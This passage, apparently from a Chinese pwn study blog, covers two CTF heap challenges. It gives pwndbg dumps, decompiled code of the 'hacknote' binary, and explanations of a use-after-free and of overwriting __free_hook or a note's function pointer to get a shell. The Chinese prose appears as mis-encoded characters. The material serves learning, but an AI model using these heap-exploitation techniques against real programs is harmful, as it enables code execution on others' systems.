0x555555602040</span></span><br><span class="line">0x555555602040: 0x6262626262626262      0x6262626262626262</span><br><span class="line">0x555555602050: 0x6262626262626262      0x6262626262626262</span><br><span class="line">0x555555602060: 0x0000555555603700      0x00005555556037d0</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆï¼Œ0x0000555555603600 è¿™ä¸ªåœ°å€æŒ‡å‘çš„åœ°æ–¹æ˜¯å“ªé‡Œå‘¢ï¼Ÿç”¨ heap æŒ‡ä»¤çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603290</span><br><span class="line">Size: 0x410 (with flag bits: 0x411)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556036a0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556036c0</span><br><span class="line">Size: 0xd0 (with flag bits: 0xd1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603790</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556037c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556037f0</span><br><span class="line">Size: 0x20810 (with flag bits: 0x20811)</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°è¿™ä¸ªåœ°å€æ˜¯åœ¨ book1_desc çš„ä¸­é—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/50gx 0x5555556036c0</span></span><br><span class="line">0x5555556036c0: 0x0000000000000000      0x00000000000000d1</span><br><span class="line">0x5555556036d0: 0x65645f316b6f6f62      0x0000000000006373</span><br><span class="line">0x5555556036e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556036f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603700: 0x0000000000000000      0x0000000000000000&lt;-------------------</span><br><span class="line">0x555555603710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603770: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603780: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603790: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class="line">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class="line">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class="line">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class="line">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class="line">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å†…å­˜å¸ƒå±€å¤§æ¦‚æœ‰äº†ï¼Œè¿™é‡Œå€Ÿç”¨æŸä½å¤§ä½¬çš„å›¾ï¼ˆhollkï¼‰ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5946f3207d5348e39aa969baf50b0db3.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¿®æ”¹äº† book1 çš„ç»“æ„ä½“æŒ‡é’ˆåœ°å€ä¹‹åï¼Œå› ä¸º book1_name è¿™é‡Œæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æŒ‡å‘çš„é‚£ä¸ªåœ°å€ä¼ªé€ ä¸€ä¸ª fake_chunkï¼Œ</p><p>â€‹å› ä¸ºåé¢ç¡®å®å¯¹æˆ‘è€Œè¨€æœ‰ç‚¹é€†å¤©ï¼Œæ‰€ä»¥ä¹‹åå°±ç®€è¿°äº†å§ï¼Œä¹‹åå°±æ˜¯ä¼ªé€  chunk æ³„éœ² libc åœ°å€ï¼Œç„¶åç»§ç»­ä¼ªé€  fakechunk ä¿®æ”¹ <code>__free_hook</code>  ä¸º one_gadgetï¼Œå³å¯æ‹¿åˆ° shellã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnå­¦ä¹ ç¬”è®°ï¼ˆ10ï¼‰--UAF</title>
      <link href="/posts/540e5c20.html"/>
      <url>/posts/540e5c20.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°10uaf"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°10uaf">#</a> Pwn å­¦ä¹ ç¬”è®°ï¼ˆ10ï¼‰â€“UAFï¼š</h1><p>â€‹UAF å°±æ˜¯ Use-After-Freeï¼Œå³ä¸€ä¸ªæŒ‡å‘å †å—çš„æŒ‡é’ˆè¢«é‡Šæ”¾åæŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œå½¢æˆäº†æ‚¬ç©ºæŒ‡é’ˆï¼Œä½¿å¾—å †å¯ä»¥å†æ¬¡è¢«ä½¿ç”¨ã€‚</p><p>â€‹ç”±äºæˆ‘ç¯å¢ƒä¼¼ä¹è¿è¡Œä¸äº†æŸä¸ªç¨‹åºï¼Œæ‰€ä»¥æ¼”ç¤ºå°±ä¸åšäº†ï¼Œä¸Šä¸ªç®€å•é¢˜æ¥çœ‹çœ‹ã€‚</p><p>â€‹é¢˜ç›®æ˜¯ä¸€ä¸ªæ ‡å‡†çš„èœå•é¢˜ï¼Œæœ‰åˆ›å»º note å’Œè¾“å‡ºåˆ é™¤çš„åŠŸèƒ½ï¼Œåˆ«çš„ä¸çœ‹äº†ï¼Œç›´æ¥çœ‹é‚£ä¸‰ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;notelist + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å…ˆåˆ†é…äº†ä¸€ä¸ªå †ç©ºé—´ï¼Œå…·ä½“å¤§å°ä¸ºæ•°ç»„ notelist çš„å•ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä¹‹åå°±æ˜¯è®© noteliist ç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br></pre></td></tr></table></figure><p>â€‹ä¼°è®¡ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä¹‹å malloc ç¬¬äºŒä¸ªå †ï¼Œåœ°å€èµ‹ç»™ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹‹åè¯»å– size å¤§å°çš„å­—ç¬¦è¿›å…¥ç¬¬äºŒä¸ªå †å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">*(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br></pre></td></tr></table></figure><p>â€‹åˆ é™¤ noteï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;notelist + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°å…ˆååˆ é™¤äº†ä¸¤ä¸ªå †å—ï¼Œä¸€ä¸ªæ˜¯å†™å…¥çš„å †å—ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ç¬¬äºŒä¸ªç”Ÿæˆçš„å †å—ï¼Œä¹‹åé‡Šæ”¾äº†ç¬¬ä¸€ä¸ªç”Ÿæˆçš„å †å—ï¼Œä¹Ÿå°±æ˜¯å­˜æ”¾ä¸¤ä¸ªæŒ‡é’ˆçš„é‚£ä¸ªå †å—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">free</span>(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure><p>â€‹ä½†ä¹‹åæ²¡æœ‰å¯¹æŒ‡é’ˆè¿›è¡Œç½®é›¶ï¼Œå­˜åœ¨ UAF æ¼æ´ï¼Œå› ä¸º show é‡Œå­˜åœ¨ idx å‚æ•°ï¼Œé‡Šæ”¾åå¦‚æœç”³è¯·å¤§å°å·®ä¸å¤šçš„å †å—ã€‚</p><p>â€‹ä¹‹åæ˜¯ print_note å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œè°ƒç”¨äº†é‚£ä¸ªå †å—é‡Œçš„åŠ¨æ€å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure><p>â€‹æ‰€ä»¥åªéœ€è¦æƒ³åŠæ³•ä¿®æ”¹è¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆå³å¯ getshellã€‚</p><p>â€‹ä¸Š gdb è°ƒä¸€ä¸‹ï¼Œå…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼Œä¹‹å ctrl+c æ‰§è¡Œ gdb æŒ‡ä»¤çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /mnt/c/Users/20820/Downloads/hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :20</span><br><span class="line">Content :aaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :30</span><br><span class="line">Content :AAA</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæŸ¥çœ‹ä¸‹ heap çŠ¶æ€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>â€‹é™¤å¼€æœ€å¼€å§‹çš„é‚£ä¸ª size ä¸º 0x190 çš„é‚£ä½ä»¥å¤–ï¼Œå…¶ä»–çš„å¤§è‡´ç¬¦åˆæƒ…å†µ ï¼Œä¸¤æ¬¡éƒ½æ˜¯å…ˆç”³è¯·äº†ä¸€ä¸ªå †å—å­˜æ”¾ä¸¤ä¸ªåœ°å€ï¼Œç„¶åç”³è¯·å¦ä¸€ä¸ªå †å—æ¥å­˜æ”¾è¾“å…¥çš„å†…å®¹ï¼Œä¹‹åè¯»ä¸€ä¸‹ 0x804b198 çš„å†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b1b00804865b&lt;---è¿™é‡Œä¸¤ä¸ªæ•°æ®ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯0x0804865bï¼Œå¦ä¸€ä¸ªå°±æ˜¯è¾“å…¥åœ°å€çš„é‚£ä¸ªå †å—çš„åœ°å€0x0804b1b0</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x000000000a616161</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1e00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x000000000a414141</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°åœ¨ IDA é‡Œçš„åœ°å€æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0804865B print_note_content proc near            ; DATA XREF: add_note+9Aâ†“o</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B arg_0           = dword ptr  8</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B ; __unwind &#123;</span><br><span class="line">.text:0804865B                 push    ebp</span><br><span class="line">.text:0804865C                 mov     ebp, esp</span><br><span class="line">.text:0804865E                 sub     esp, 8</span><br><span class="line">.text:08048661                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08048664                 mov     eax, [eax+4]</span><br><span class="line">.text:08048667                 sub     esp, 0Ch</span><br><span class="line">.text:0804866A                 push    eax             ; s</span><br><span class="line">.text:0804866B                 call    _puts</span><br><span class="line">.text:08048670                 add     esp, 10h</span><br><span class="line">.text:08048673                 nop</span><br><span class="line">.text:08048674                 leave</span><br><span class="line">.text:08048675                 retn</span><br><span class="line">.text:08048675 ; &#125; // starts at 804865B</span><br><span class="line">.text:08048675 print_note_content endp</span><br></pre></td></tr></table></figure><p>â€‹æ­¤æ—¶ bins 